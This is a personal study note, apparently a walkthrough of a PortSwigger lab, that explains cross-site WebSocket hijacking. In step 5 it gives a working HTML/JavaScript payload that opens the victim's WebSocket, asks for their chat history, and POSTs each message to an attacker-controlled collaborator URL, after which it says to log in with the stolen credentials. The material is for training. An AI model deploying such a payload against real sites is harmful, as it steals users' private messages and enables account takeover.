## What is cross-site WebSocket hijacking?
   - Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a CSRF vulnerability on a WebSocket handshake. 
   - It arises when the WebSocket handshake request relies solely on HTTP cookies for session handling and does not contain any CSRF tokens or other unpredictable values.
   - An attacker can create a malicious web page on their own domain which establishes a cross-site WebSocket connection to the vulnerable application. The application will handle the connection in the context of the victim user's session with the application.
   - The attacker's page can then send arbitrary messages to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular CSRF, the attacker gains two-way interaction with the compromised application.

## What is the impact of cross-site WebSocket hijacking?

 **A successful cross-site WebSocket hijacking attack will often enable an attacker to:**

   - **Perform unauthorized actions masquerading as the victim user**
	   - As with regular CSRF the malicious person can send any kind of messages to the application running on the server. If the application relies on messages sent from the user's browser via WebSocket for important tasks(sensitive actions). Then attacker, by using a different domain, can create the right kind of messages to trick the application into performing sensitive actions without the user's knowledge or consent.

   - **Retrieve sensitive data that the user can access**
	   - Unlike with regular CSRF, In this kind of attack(*cross-site WebSocket hijacking*), the malicious person not only sends messages to the vulnerable application but can also receive responses from it, allowing them to have a back-and-forth conversation or interaction with the application, which is not usually possible in a standard CSRF attack.
	   - If the application uses server-generated WebSocket messages to return any sensitive data to the user, then the attacker can intercept those messages and capture the victim user's data.

## Performing a cross-site WebSocket hijacking attack
   - Since a cross-site WebSocket hijacking attack is essentially a [CSRF vulnerability](https://portswigger.net/web-security/csrf) on a WebSocket handshake, the first step to performing an attack is to review the WebSocket handshakes that the application carries out and determine whether they are protected against CSRF.
   - In terms of the [normal conditions for CSRF attacks](https://portswigger.net/web-security/csrf#how-does-csrf-work), you typically need to find a handshake message that relies solely on HTTP cookies for session handling and doesn't employ any tokens or other unpredictable values in request parameters.

  **For example, the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie:**
```js
GET /chat HTTP/1.1 
Host: normal-website.com 
Sec-WebSocket-Version: 13 
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== 
Connection: keep-alive, Upgrade 
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 
Upgrade: websocket  
```

#### Note
The `Sec-WebSocket-Key` header contains a random value to prevent errors from caching proxies, and is not used for authentication or session handling purposes.

If the WebSocket handshake request is vulnerable to CSRF, then an attacker's web page can perform a cross-site request to open a WebSocket on the vulnerable site. What happens next in the attack depends entirely on the application's logic and how it is using [WebSockets](https://portswigger.net/web-security/websockets). The attack might involve:
   - Sending WebSocket messages to perform unauthorized actions on behalf of the victim user.
   - Sending WebSocket messages to retrieve sensitive data.
   - Sometimes, just waiting for incoming messages to arrive containing sensitive data.

## Steps to solve lab
### Title - Cross-site WebSocket hijacking

**Desc** - This online shop has a live chat feature implemented using [WebSockets](https://portswigger.net/web-security/websockets). To solve the lab, use the exploit server to host an HTML/JavaScript payload that uses a [cross-site WebSocket hijacking attack](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) to exfiltrate the victim's chat history, then use this to gain access to their account.


#### What we found out after analyzing lab
![[WebSockets14.png]]

#### Whole scenario of what we are going to do?
![[WebSockets15.png]]

1. Browse to the application function that uses WebSockets and also look for entries appearing in the WebSockets history tab within Burp Proxy.
![[WebSockets2.png]]

2. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
![[authentication27.png]]

3. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no [CSRF](https://portswigger.net/web-security/csrf) tokens.
![[WebSockets16.png]]

4. Right-click on the handshake request and select "Copy URL".

5. In the browser, go to the exploit server and paste the following template into the "Body" section:
```js
<script>
    // Creation of new WebSocket(that WebSocket that is used by lab)
    var ws = new WebSocket('wss://your-websocket-url');

    // Sending the "READY" command as soon as WebSocket connection is open(onopen is a event). After sending the "READY" command the WebSocket will reply with the entire chat history
    ws.onopen = function() {
        ws.send("READY");
    };
  
    // Once we receive messages from the WebSocket then we do a GET request with those messages to our collaborator server
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

6. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by [Burp Collaborator](https://portswigger.net/burp/documentation/desktop/tools/collaborator).
7. Click "Deliver exploit to victim".
8. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved carlos chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
![[WebSockets17.png]]

9. Now, login with these credentials to solve the lab.


